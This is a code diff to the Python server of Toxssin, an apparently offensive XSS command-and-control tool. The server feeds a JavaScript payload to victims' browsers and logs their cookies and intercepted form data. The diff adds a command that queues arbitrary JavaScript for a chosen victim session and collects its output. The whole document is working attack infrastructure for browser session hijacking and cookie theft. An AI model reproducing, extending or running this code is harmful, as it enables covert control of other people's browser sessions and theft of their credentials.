@@ -27,6 +27,7 @@ filterwarnings("ignore", category = DeprecationWarning)
 MAIN = '\033[38;5;50m'
 GREEN = '\033[38;5;82m'
 BLUE = '\033[0;38;5;12m'
+LPURPLE = '\033[0;38;5;201m'
 ORANGE = '\033[0;38;5;214m'
 ORANGEB = '\033[1;38;5;214m'
 PURPLE = '\033[0;38;5;141m'
@@ -155,9 +156,8 @@ def print_green(msg):
 def rst_prompt(force_rst = False):
 	
 	if Toxssin.rst_promt_required or force_rst:
-
 		sys.stdout.write('\r' + prompt + readline.get_line_buffer())
-		sys.stdout.flush()
+		#sys.stdout.flush()
 		Toxssin.rst_promt_required = False	
 
 
@@ -247,7 +247,6 @@ def get_dt_prefix():
 	return datetime_prefix
 
 
-
 def chill():
 	pass
 
@@ -304,6 +303,7 @@ class Toxssin(BaseHTTPRequestHandler):
 	victims = {}
 	active = None
 	rst_promt_required = False
+	command_pool = []
 	
 	preferences = {
 		'*TOXSSIN_SERVER*' : toxssin_server_url,
@@ -372,7 +372,7 @@ class Toxssin(BaseHTTPRequestHandler):
 			self.end_headers()								
 			handler_src = open(f'./handler.js', 'r')
 			payload = handler_src.read()
-			handler_src.close()		
+			handler_src.close()
 			payload = payload.replace('*TOXSSIN_SERVER*', Toxssin.preferences["*TOXSSIN_SERVER*"]).replace('*COOKIE_AGE*', cookie_age)			
 			self.wfile.write(bytes(payload, "utf-8"))
 			
@@ -431,7 +431,36 @@ class Toxssin(BaseHTTPRequestHandler):
 				
 				rst_prompt(force_rst = True)
 
-		
+
+		# Command exec
+		elif re.search('a95f7870b615a4df433314f10da26548', self.path):
+			
+			self.send_response(200)
+			self.send_header('Access-Control-Allow-Origin', '*')
+			path_to_cmd = False		
+			
+			if len(Toxssin.command_pool) > 0:
+				if any(toxssin_id in cmd for cmd in Toxssin.command_pool):
+					for i in range(0, len(Toxssin.command_pool)):
+						if toxssin_id in Toxssin.command_pool[i]:
+							path_to_cmd = Toxssin.command_pool.pop(i)[toxssin_id]
+							break
+							
+			path_to_cmd = 'None' if not path_to_cmd else path_to_cmd
+			self.send_header('Content-type', str(path_to_cmd)) if path_to_cmd != 'None' else self.send_header('Content-type', 'text/javascript; charset=UTF-8')			
+			self.end_headers()
+			
+			if path_to_cmd == 'None':
+				Toxssin.rst_promt_required = False
+				self.wfile.write(bytes("<%NoCmdIssued%>", "utf-8"))				
+				
+			else:
+				src = open(f'{path_to_cmd}', 'r')
+				payload = src.read()
+				src.close()				
+				self.wfile.write(bytes(payload, "utf-8"))				
+				
+	
 		elif toxssin_id in Toxssin.execution_verified:
 			
 			try:
@@ -467,13 +496,15 @@ class Toxssin(BaseHTTPRequestHandler):
 				elif data['event'] == 'cookie':
 					if Toxssin.victims[toxssin_id]['cookie'] == None:
 						echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie{END}] {GREEN}{data["data"]}{END}', toxssin_id)
+						Toxssin.victims[toxssin_id]['cookie'] = data["data"]
 						
 					elif Toxssin.victims[toxssin_id]['cookie'] not in [None, data["data"]]:
 						echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie-Value-Changed{END}] {GREEN}{data["data"]}{END}', toxssin_id)
-					
-					Toxssin.victims[toxssin_id]['cookie'] = data["data"]
-					Toxssin.rst_promt_required = False
-				
+						Toxssin.victims[toxssin_id]['cookie'] = data["data"]
+						
+					else:
+						Toxssin.rst_promt_required = False
+						
 
 				elif data['event'] == 'info':
 					echo_log(f'[{datetime_prefix[1]}] [{INFO}] {data["msg"]}', toxssin_id)
@@ -497,7 +528,6 @@ class Toxssin(BaseHTTPRequestHandler):
 
 		
 		
-	
 	def do_POST(self):
 				
 		datetime_prefix = get_dt_prefix()
@@ -565,8 +595,7 @@ class Toxssin(BaseHTTPRequestHandler):
 			
 			for header in response_headers.split('\n'):
 				echo_log(f'  {header}', toxssin_id, green = True, rst = False)
-			
-				
+						
 			echo_log(f'  {BOLD}Response Body:\n{END}', toxssin_id, rst = False)					
 			log_capture('response-intercept', f'{" ".join(datetime_prefix)}, href: {href}', post_data, response_headers, toxssin_id) if self.headers.get('X-form-source') == 'link' else log_capture('response-intercept', ' '.join(datetime_prefix), post_data, response_headers, toxssin_id)
 
@@ -599,7 +628,28 @@ class Toxssin(BaseHTTPRequestHandler):
 			post_data = self.rfile.read(content_len)
 			echo_log(f'[{datetime_prefix[1]}] [{TABLE}] {BOLD}Table data{END} (Received via POST request):\n', toxssin_id, rst = False)				
 			log_capture('table', ' '.join(datetime_prefix), post_data, real_action, toxssin_id)			
-		
+
+
+		# Script exec results
+		elif self.path == '/7f47fd7ae404fa7c0448863ac3db9c85' and toxssin_id in Toxssin.execution_verified:
+
+			self.send_response(200)
+			self.send_header('Access-Control-Allow-Origin', '*')
+			self.send_header('Content-Type', 'text/plain')
+			self.end_headers()
+			self.wfile.write(b'OK')
+			error_msg = 'without' if int(self.headers.get('X-form-error')) == 0 else f'{RED}with{END}'
+			script = self.headers.get('X-form-script')
+			content_len = int(self.headers.get('Content-Length'))
+			results = self.rfile.read(content_len)
+			try:
+				results = results.decode('utf-8') 
+			except UnicodeDecodeError:
+				echo_log(f'{ORANGE}Decoding data to UTF-8 failed. Printing raw data...{END}', toxssin_id)
+				
+			echo_log(f'[{datetime_prefix[1]}] [{LPURPLE}Custom Script Exec{END}] [SID: {toxssin_id}] {BOLD}Script {ORANGE}{script}{END} {BOLD}executed {error_msg} {BOLD}error(s). Output{END}:\n{GREEN}{results}{END}', toxssin_id, echo = True, rst = False)
+			rst_prompt(force_rst = True)
+	
 		else:
 			self.send_response(200)
 			self.end_headers()
@@ -617,7 +667,7 @@ class Toxssin(BaseHTTPRequestHandler):
 		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
 		self.send_header('Vary', "Origin")
 		self.send_header('Access-Control-Allow-Credentials', 'true')
-		self.send_header('Access-Control-Allow-Headers', 'X-toxssin-id, X-form-action, X-form-source, X-form-href, X-form-method, X-form-enctype, X-form-encoding, X-form-status, X-form-statusText, X-form-responseHeaders')
+		self.send_header('Access-Control-Allow-Headers', 'X-toxssin-id, X-form-error, X-form-script, X-form-action, X-form-source, X-form-href, X-form-method, X-form-enctype, X-form-encoding, X-form-status, X-form-statusText, X-form-responseHeaders')
 		self.end_headers()
 		self.wfile.write(b'OK')
 			
@@ -629,7 +679,7 @@ class Toxssin(BaseHTTPRequestHandler):
 def main():
 	
 	try:
-		global verbose
+		global verbose, key_detector
 		server_port = int(args.port) if args.port else 443
 		
 		try:
@@ -662,32 +712,36 @@ def main():
 		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}Type "help" to get a list of the available commands.{END}')
 		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}All sessions are logged by default.{END}')
 		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}Awaiting XSS GET request for {handler}{END}')
-		
+			
 		toxssin_server = Thread(target = httpd.serve_forever, args = ())
 		toxssin_server.daemon = True
 		toxssin_server.start()
 		
 		# Command prompt
 		while True:
-			
-			cmd = input(prompt).strip().lower()
+
+			user_input = input(prompt).strip().split(' ')
+			cmd_list = [w for w in user_input if w]
+			cmd = cmd_list[0].lower() if cmd_list else ''
 			
 			if cmd == 'help':
 				print(
 				'''
-				\r  Command                 Description
-				\r  -------                 -----------
-				\r  help                    Print this message.
-				\r  sessions                Print all victim sessions data.
-				\r  active                  Print active session data (the one that is currently printing on stdout).
-				\r  activate <session id>   Change the active session by providing the session id.
-				\r  flush                   Delete all current sessions (reset).
-				\r  verbose                 Enable/disable verbose mode.
-				\r  clear/cls               Clear screen.
-				\r  exit/quit/q             Terminate program.
+				\r  Command                    Description
+				\r  -------                    -----------
+				\r  help                       Print this message.
+				\r  sessions                   Print all victim sessions data.
+				\r  active                     Print active session data (the one that is currently printing on stdout).
+				\r  activate <sid>             Change the active session by providing the session id.
+				\r  flush                      Delete all current sessions (reset).
+				\r  exec <JS file path> <sid>  Execute custom JS script against session by id.                  
+				\r  verbose                    Enable/disable verbose mode.
+				\r  clear/cls                  Clear screen.
+				\r  exit/quit/q                Terminate program.
 				
 				\r  *All sessions are logged despite of which one is active.
 				''')
+				
 			elif cmd == 'sessions':
 				total_sessions = len(Toxssin.victims.keys())
 				if total_sessions > 0:
@@ -700,24 +754,41 @@ def main():
 				else:
 					print('\nNo sessions established ¯\_(ツ)_/¯\n')
 					
+					
 			elif cmd == 'active':
 				print(f'\n{BOLD}Session id{END}: {Toxssin.active}\n{BOLD}Data{END}: {Toxssin.victims[Toxssin.active]}\n') if Toxssin.active else print('\nNo sessions established ¯\_(ツ)_/¯\n')
+
 
 			elif cmd == 'verbose':
 				verbose = not verbose
 				print(f'\nVerbose mode enabled.\n') if verbose else print('\nVerbose mode disabled.\n')
 
+
 			elif cmd in ['clear', 'cls']:
 				os.system('clear')
-				
+			
+			
+			elif cmd == 'exec':
+				script = cmd_list[1].replace("~", os.path.expanduser("~"))				
+				sid = Toxssin.active if cmd_list[2].lower() == 'active' else cmd_list[2]
+
+				if os.path.exists(script):
+					pair = {sid : script}
+					Toxssin.command_pool.append(pair)
+					print('\nScript appended for execution. Awaiting results.\n')
+				else:
+					print('\nFile not found.\n')
+								
+									
 			elif cmd == 'flush':
 				Toxssin.execution_verified = []
 				Toxssin.victims = {}
 				Toxssin.active = None
 				print(f'\n{BOLD}All sessions deleted.{END}\n')
 
+
 			elif re.search('activate', cmd):
-				sid = cmd.strip().split()[1]
+				sid = cmd_list[1]
 				if sid == Toxssin.active:
 					print(f'\n{RED}Already active.{END}\n')
 					
@@ -730,15 +801,18 @@ def main():
 				else:
 					print(f'\n{RED}Invalid Session id.{END}\n')				
 			
+			
 			elif cmd in ['exit', 'quit', 'q']:
 				sys.exit(0)
+			
 			
 			elif cmd == '':
 				pass
 				
 			else:
 				print('\nInvalid command.\n')
-			
+
+			readline.clear_history()
 			
 	except KeyboardInterrupt:
 		print(f'\n[{get_dt_prefix()[1]}] [{WARN}] {BOLD}Session terminated by user{END}.')
